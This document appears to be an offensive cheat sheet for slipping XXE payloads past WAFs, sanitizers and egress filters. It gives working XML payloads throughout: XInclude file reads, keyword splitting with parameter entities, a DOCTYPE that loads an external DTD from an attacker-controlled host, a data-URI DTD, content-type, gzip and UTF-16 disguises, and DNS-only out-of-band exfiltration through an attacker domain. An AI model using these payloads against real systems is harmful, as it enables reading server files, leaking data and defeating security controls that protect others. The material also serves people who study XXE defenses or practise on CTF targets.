# Filter / WAF Bypass — getting the DOCTYPE through

## The filter layers — know which one blocks you

1. **Input WAF** (ModSecurity, cloud WAF) — matches raw bytes for
   `DOCTYPE`, `<!ENTITY`, `SYSTEM`, `file://`
2. **App-side sanitizer** — string-replace on the payload, or
   "strip DOCTYPE", or `defusedxml`
3. **Parser config** — `disallow-doctype-decl`, `DtdProcessing.Prohibit`
   — the entity never gets a chance
4. **Egress firewall** — the fetch itself is blocked — blind XXE dead
   even though the parser is live

Identify the layer by the error: WAF block page vs app 400 vs parser
exception vs silent-timeout-on-callback.

## Bypassing the DOCTYPE byte-filter — no DOCTYPE at all

- **XInclude** — `xinclude.md` — `<xi:include href="file:///flag"/>` —
  no DOCTYPE, no ENTITY keyword at all. The strongest single bypass.
- **SOAP/XML-RPC wrappers** — the XML is inside a protocol frame the
  WAF may whitelist.
- **The `.xml` in a ZIP** — DOCX/SVG/EPUB — the WAF scans the
  container, not each part — `ooxml.md`.

## Bypassing `ENTITY`/`SYSTEM` keyword filters — case + whitespace

```xml
<!ENTITY x SYSTEM "file:///flag">        baseline
<!eNTITY x SYSTEM "file:///flag">        — XML is case-SENSITIVE; this BREAKS it.
<!ENTITY%20x%20SYSTEM...>                 — URL-encoding inside XML? no.
<!ENTITY
  x SYSTEM "file:///flag">                — newline inside decl — legal XML
<!ENTITY	x SYSTEM ...>                  — tab separator — legal
<!ENTITY x
SYSTEM "file:///flag">                    — split across lines — legal
```

XML IS case-sensitive — `Entity`/`entity` won't parse. But whitespace
ANYWHERE between tokens is legal — split keywords across lines/tabs.

## The keyword-split via parameter entities — when the filter sees the outer doc

```xml
<!DOCTYPE r [
  <!ENTITY % a "SYSTEM">
  <!ENTITY % x "&#37;">
  <!ENTITY % y "<!ENTITY e %a; 'file:///flag'>">
  %y;
]>
```

A param-entity whose VALUE builds the forbidden keyword — the filter
sees `%a;` not `SYSTEM`. Requires param-entities to expand in the
internal subset — works against libxml2, breaks on strict parsers —
push the composition into an external DTD for the strict case —
`external-dtd.md`.

## The external-DTD move — DOCTYPE exists but contains nothing

```xml
<!DOCTYPE r SYSTEM "http://YOU/e.dtd">
<r>&x;</r>
```

The document body has NO `<!ENTITY` at all — the entities live on YOUR
server. A filter scanning the uploaded/pasted XML sees only a DOCTYPE
with a SYSTEM URI — which may itself be whitelisted ("external DTDs
are normal"). The real payload is server-side. `external-dtd.md`.

## The `data:`-URI DTD — libxml2/PHP only

```xml
<!DOCTYPE r [
  <!ENTITY % d SYSTEM "data:text/plain,%3C!ENTITY%20x%20SYSTEM%20'file:///flag'%3E">
  %d;
]>
<r>&x;</r>
```

The external DTD is a `data:` URI — no HTTP fetch, no URL for a filter
to flag. libxml2 supports `data:` — Java/.NET don't.

## Entity-vs-parameter confusion — filter checks `&x;` not `%x;`

A filter that only catches `&name;` general entities — param entities
`%name;` slip — and param entities alone carry the OOB exfil.

## The Content-Type disguise — the WAF checks `Content-Type`, not the body

Send `Content-Type: application/json` with an XML body — if the app
sniffs the body instead of trusting the header, the XML parser still
runs — `content-type-confusion.md`.

## The "XML inside the parameter" — JSON/body nested

```json
{"xml": "<?xml version='1.0'?><!DOCTYPE r [...]><r>&x;</r>"}
```

App extracts the field and feeds it to a parser — the WAF sees JSON —
the parser sees XML.

## Encoding tricks — `utf-encodings.md`

UTF-16 the whole doc — `DOCTYPE` becomes `D\0O\0C\0T\0Y\0P\0E\0` — a
byte-filter sees nothing; EBCDIC (`IBM037`) for Java.

## The gzip transport — `Content-Encoding: gzip`

If the endpoint accepts gzipped bodies (`Content-Encoding: gzip` or a
decompress step), gzip the XML — WAF sees compressed bytes, the parser
gets plaintext XML after decompression.

## Bypassing egress filters — the fetch can't leave

- The DTD/OOB host must be reachable — if outbound 80/443 is blocked
  to arbitrary hosts: try the app's own URL, a whitelisted CDN, a
  DNS-only callback (no TCP egress needed if DNS resolves), or an
  `internal` URL the app itself would fetch
- **DNS-only OOB** — `<!ENTITY % x SYSTEM "http://EXFIL.youdns/">` —
  even if HTTP egress is filtered, the DNS lookup for `EXFIL.youdns`
  fires — carry the exfil in the subdomain — `blind-xxe.md`
- **The local-DTD hijack** — no egress at all: use a DTD already on
  disk — `local-dtd-hijack.md`

## The parser-config wall — when the parser itself refuses

`disallow-doctype-decl` / `DtdProcessing.Prohibit` → XInclude is the
only remaining XML feature that fetches — `xinclude.md`. If XInclude
is also off and the parser resolves NO entities — the class is dead on
this surface — pivot to a different input point or a different class.

## Output to record

- which filter layer blocked, which bypass layer-by-layer worked, and
  the verbatim post-bypass result
